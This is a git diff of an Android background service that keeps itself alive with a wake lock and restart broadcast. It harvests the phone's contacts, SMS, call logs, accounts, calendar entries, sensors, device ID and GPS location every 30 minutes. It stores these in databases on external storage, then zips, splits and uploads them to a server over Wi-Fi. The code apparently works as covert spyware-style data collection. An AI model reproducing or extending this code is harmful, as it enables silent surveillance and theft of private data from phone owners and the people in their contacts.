@@ -1,26 +1,16 @@
 package com.example.muhammadfahad.readjs.service;
 
-import android.Manifest;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
-import android.app.AlertDialog;
 import android.app.Service;
 import android.content.Context;
-import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
-import android.content.pm.PackageManager;
-import android.database.Cursor;
-import android.hardware.SensorManager;
-import android.location.Address;
-import android.location.Criteria;
-import android.location.Geocoder;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
-import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -29,67 +19,26 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.Message;
-import android.os.Parcelable;
 import android.os.PowerManager;
 import android.os.StatFs;
 import android.os.StrictMode;
-import android.provider.ContactsContract;
-import android.provider.Settings;
-import android.support.annotation.NonNull;
-import android.support.annotation.Nullable;
-import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.widget.Toast;
 
-
-import com.example.muhammadfahad.readjs.MyApplication;
-import com.example.muhammadfahad.readjs.SingletonSavesContext;
 import com.example.muhammadfahad.readjs.StartActivity;
-import com.example.muhammadfahad.readjs.bean.DataBean;
 import com.example.muhammadfahad.readjs.bean.InfoBean;
-import com.example.muhammadfahad.readjs.bean.PlaceBean;
 import com.example.muhammadfahad.readjs.bean.Records;
 import com.example.muhammadfahad.readjs.dao.DBHelper;
-import com.example.muhammadfahad.readjs.utils.Backup;
 import com.example.muhammadfahad.readjs.utils.Compress;
 import com.example.muhammadfahad.readjs.utils.FileSplitter;
 import com.example.muhammadfahad.readjs.utils.Helper;
 import com.example.muhammadfahad.readjs.utils.Logger;
-import com.google.android.gms.common.ConnectionResult;
-import com.google.android.gms.common.api.GoogleApiClient;
-import com.google.android.gms.location.FusedLocationProviderClient;
-import com.google.android.gms.location.LocationRequest;
-import com.google.android.gms.location.LocationServices;
-import com.google.android.gms.location.places.GeoDataClient;
-import com.google.android.gms.location.places.Place;
-import com.google.android.gms.location.places.PlaceBufferResponse;
-import com.google.android.gms.location.places.PlaceDetectionClient;
-import com.google.android.gms.location.places.PlaceLikelihood;
-import com.google.android.gms.location.places.PlaceLikelihoodBufferResponse;
-import com.google.android.gms.location.places.Places;
-import com.google.android.gms.tasks.OnCompleteListener;
-import com.google.android.gms.tasks.Task;
-import com.squareup.leakcanary.RefWatcher;
 
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileWriter;
 import java.io.IOException;
-import java.io.Writer;
-import java.text.ParseException;
-import java.text.SimpleDateFormat;
-import java.util.ArrayList;
-import java.util.Date;
 import java.util.List;
-import java.util.Locale;
 import java.util.Timer;
 import java.util.TimerTask;
-
 
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
@@ -98,7 +47,18 @@ import okhttp3.Request;
 import okhttp3.RequestBody;
 import okhttp3.Response;
 
-import static com.example.muhammadfahad.readjs.utils.Backup.*;
+import static com.example.muhammadfahad.readjs.utils.Backup.AccountList;
+import static com.example.muhammadfahad.readjs.utils.Backup.BatteryList;
+import static com.example.muhammadfahad.readjs.utils.Backup.CalendarContractEventsList;
+import static com.example.muhammadfahad.readjs.utils.Backup.CalendarContractRemindersList;
+import static com.example.muhammadfahad.readjs.utils.Backup.CallList;
+import static com.example.muhammadfahad.readjs.utils.Backup.ContactList;
+import static com.example.muhammadfahad.readjs.utils.Backup.DeviceInfoList;
+import static com.example.muhammadfahad.readjs.utils.Backup.LocationList;
+import static com.example.muhammadfahad.readjs.utils.Backup.SensorList;
+import static com.example.muhammadfahad.readjs.utils.Backup.SmsList;
+import static com.example.muhammadfahad.readjs.utils.Backup.fetchNumber;
+import static com.example.muhammadfahad.readjs.utils.Backup.insertNumber;
 
 public class MyService extends Service implements LocationListener {
     private TelephonyManager tm;
@@ -108,7 +68,7 @@ public class MyService extends Service implements LocationListener {
     private FileSplitter fileSplitter;
     private String device_id;
 
-    private Compress c,cLoc;
+    private Compress c;
     private OkHttpClient client;
     private Request request;
     private Response response;
@@ -127,10 +87,8 @@ public class MyService extends Service implements LocationListener {
     LocationManager locationManager;
     long time;
 
-    int GPS_TIME = 0;
-    public MyService() {
-        SingletonSavesContext.getInstance().setContext(this);
-    }
+    private static int GPS_TIME = 1000*60*30;
+
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -141,33 +99,20 @@ public class MyService extends Service implements LocationListener {
     @Override
     public void onCreate() {
         super.onCreate();
-        if (android.os.Build.VERSION.SDK_INT > 9) {
+       // if (android.os.Build.VERSION.SDK_INT > 9) {
             StrictMode.ThreadPolicy policy =
                     new StrictMode.ThreadPolicy.Builder().permitAll().build();
             StrictMode.setThreadPolicy(policy);
-        }
+       // }
         PowerManager pm = (PowerManager) getSystemService(this.POWER_SERVICE);
 
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DoNotSleep");
-        try{
-            client = new OkHttpClient();
-            Request request_time=new Request.Builder()
-                    .url("https://mfahad88.000webhostapp.com/time.php")
-                    .build();
-            Response response_time=client.newCall(request_time).execute();
-            JSONArray array_time=new JSONArray(response_time.body().string());
-            JSONObject object_radius=array_time.getJSONObject(0);
-            GPS_TIME= Integer.parseInt(object_radius.getString("value"));
-        }catch (Exception e){
-            e.printStackTrace();
-        }
+
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        RefWatcher refWatcher = MyApplication.getRefWatcher(this);
-        refWatcher.watch(this);
         Intent restartService = new Intent("RestartService");
         sendBroadcast(restartService);
     }
@@ -177,9 +122,7 @@ public class MyService extends Service implements LocationListener {
     @Override
     public void onStart(Intent intent, int startId) {
         super.onStart(intent, startId);
-
         Logger.logcat();
-        final Handler handler_loc=new Handler();
         time= System.currentTimeMillis();
         sharedPreferences = getSharedPreferences(StartActivity.MyPREFERENCES, Context.MODE_PRIVATE);
         infoBean = new InfoBean(sharedPreferences.getString("MobileNo", ""), sharedPreferences.getString("Cnic", ""),
@@ -188,57 +131,28 @@ public class MyService extends Service implements LocationListener {
         tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         device_id = tm.getDeviceId();
 
+        client = new OkHttpClient();
 
         wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
 
         connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-
 
         mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
         dbFileLoc= Environment.getExternalStorageDirectory()+ File.separator+device_id+"_loc_DB.db";
         dbHelperLoc=new DBHelper(getApplicationContext(),dbFileLoc);
 
         locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
-
-
-
-        //locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,GPS_TIME,0,this);
-        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,GPS_TIME,0,this);
-       /* if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
-            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,GPS_TIME,0,this);
-        }else{
-            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,GPS_TIME,0,this);
-        }*/
-       /* handler_loc.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
-
-                    locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER,MyService.this,null);
-                }else{
-
-                    locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER,MyService.this,null);
-                }
-
-                handler_loc.postDelayed(this,GPS_TIME);
-            }
-
-        },1000);*/
-
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,GPS_TIME,0,this);
 
         Log.d("Service>>>>>>>>>", "Inside service");
 
 
-
-
-
         if (getAvailableInternalMemorySize()) {
             if (wifiManager.isWifiEnabled() && mWifi.isConnected()) {
-                statusThread = new statusThread();
+                statusThread = new StatusThread();
                 sendDataThread = new SendDataThread();
                 statusThread.start();
                 sendDataThread.start();
-
             }
         }
     }
@@ -274,8 +188,13 @@ public class MyService extends Service implements LocationListener {
         if (location != null) {
             recId++;
             try{
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        LocationList(MyService.this, dbHelperLoc, location, recId, infoBean);
+                    }
+                }).start();
 
-                LocationList(MyService.this, dbHelperLoc, location, recId, infoBean);
             }catch (Exception e){
                 e.printStackTrace();
             }
@@ -299,7 +218,7 @@ public class MyService extends Service implements LocationListener {
 
     }
 
-    public class statusThread extends Thread {
+    public class StatusThread extends Thread {
 
         @Override
         public void run() {
@@ -316,25 +235,16 @@ public class MyService extends Service implements LocationListener {
                         for (int j = 0; j < list.size(); j++) {
                             //if (list.get(j).getStatus().equalsIgnoreCase("yes")) {
                             if (list.get(j).getStatus().equalsIgnoreCase("I")) {
-
                                 message.obj = "I";
                                 handler.sendMessage(message);
-
-
                             } else {
-
                                 message.obj = "C";
                                 handler.sendMessage(message);
-
                             }
-
-
-
                         }
                         handler.removeCallbacksAndMessages(null);
                     }
-                },0,60000);
-
+                },0,60000);  // for repeat timer
 
             } catch (Exception e) {
                 e.printStackTrace();
@@ -365,10 +275,6 @@ public class MyService extends Service implements LocationListener {
                 @Override
                 public void handleMessage(Message msg) {
                     String str = msg.obj.toString();
-
-
-
-
                     if(str.equalsIgnoreCase("I")){
                         String dbFile = Environment.getExternalStorageDirectory() + File.separator + device_id + "_DB.db";
                         DBHelper dbHelper = new DBHelper(getApplicationContext(), dbFile);
@@ -386,7 +292,7 @@ public class MyService extends Service implements LocationListener {
                         int calenderEvents=CalendarContractEventsList(getApplicationContext(),dbHelper,infoBean);
                         int battery=BatteryList(getApplicationContext(),dbHelper,infoBean);
                         int calendarReminders=CalendarContractRemindersList(getApplicationContext(),dbHelper,infoBean);
-                       // if(contact>0 && sms>0 && call>0 && sensor>0 && device>0 && account>0 && battery >0){
+
                             dbHelper.close();
                             c = new Compress(new String[]{dbFile}, dbFile);
                             try {
@@ -402,7 +308,7 @@ public class MyService extends Service implements LocationListener {
                                 try {
                                     len = fileSplitter.getNumberParts(c.zip());
                                 } catch (IOException e) {
-
+                                    e.printStackTrace();
                                 }
                                 for (int i = 0; i < len; i++) {
                                     File f = new File(String.valueOf(String.valueOf(dbFile + ".zip." + i)));
@@ -444,10 +350,13 @@ public class MyService extends Service implements LocationListener {
                                     } catch (IOException e) {
                                         e.printStackTrace();
                                     }
+                                    try {
+                                        Thread.sleep(2000);
+                                    } catch (InterruptedException e) {
+                                        e.printStackTrace();
+                                    }
                                 }
                             }
-                        //}
-                       // if(loc>0){
                             c = new Compress(new String[]{dbFileLoc}, dbFileLoc);
                             try {
                                 fileSplitter.split(c.zip());
@@ -504,6 +413,11 @@ public class MyService extends Service implements LocationListener {
                                 } catch (IOException e) {
                                     e.printStackTrace();
                                 }
+                                try {
+                                    Thread.sleep(2000);
+                                } catch (InterruptedException e) {
+                                    e.printStackTrace();
+                                }
                             }
 
 
@@ -518,7 +432,6 @@ public class MyService extends Service implements LocationListener {
 
             };
             Looper.loop();
-            //}
 
         }
 
